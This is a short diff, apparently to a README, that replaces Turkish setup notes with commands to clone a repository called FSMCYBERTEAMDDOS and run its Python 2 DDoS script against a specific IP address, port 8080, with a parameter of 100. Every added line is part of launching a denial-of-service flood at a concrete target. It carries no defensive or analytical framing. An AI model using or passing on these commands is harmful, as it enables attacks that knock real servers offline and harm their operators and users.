@@ -1,3 +1,3 @@
-git clone ve cd yi açtıktan sonra..
-ls
-bash FSMCYBERTEAMDDOS
+git clone https://github.com/FSMCYBERTEAM/FSMCYBERTEAMDDOS
+CD FSMCYBERTEAMDDOS
+python2 FSMCYBERTEAM-ddos.py 104.27.190.77 8080 100
